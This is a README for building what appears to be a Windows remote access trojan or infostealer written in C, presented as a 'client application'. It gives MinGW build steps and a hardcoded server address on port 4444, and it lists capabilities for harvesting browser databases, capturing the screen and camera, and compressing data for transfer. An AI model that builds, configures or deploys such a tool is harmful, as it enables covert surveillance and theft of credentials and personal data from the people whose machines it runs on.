# C Client Build and Run Instructions

This directory contains the C translation of the client application.

## Prerequisites
- **Windows:** GCC (MinGW-w64) installed and in your PATH. We recommend the MSYS2 or WinLibs distributions.
- **Linux (Cross-compilation):** `x86_64-w64-mingw32-gcc` installed (usually part of the `mingw-w64` package).

## Building

### On Windows
Run the provided batch file:
```cmd
build.bat
```

### On Linux (Cross-compile)
Run make:
```bash
make
```

## Configuration
The server host and port are defined in `src/main.c`:
```c
#define HOST "192.168.1.7"
#define PORT 4444
```
Update these values before building if necessary.

## Libraries Used
- **cJSON:** Lightweight JSON parsing.
- **miniz:** Deflate/Inflate and ZIP archive support.
- **sqlite3:** Database access for browser data.
- **stbi_image_write:** JPEG encoding for screen/camera captures.
- **Win32 API:** Core system functionality (Networking, GDI, Media Foundation, Debugging).

## Troubleshooting
- **Missing Headers:** Ensure your MinGW installation includes Media Foundation headers (`mfapi.h`, `mfidl.h`, etc.).
- **GUID Errors:** We use the standard `MFMediaType_Video` and `MFVideoFormat_RGB24` GUIDs. If your compiler fails to find them, verify that `mfplat.lib` is being linked.
- **SQLite Warnings:** Warnings about `strlen` in `sqlite3.c` are common in the amalgamated version and can generally be ignored.
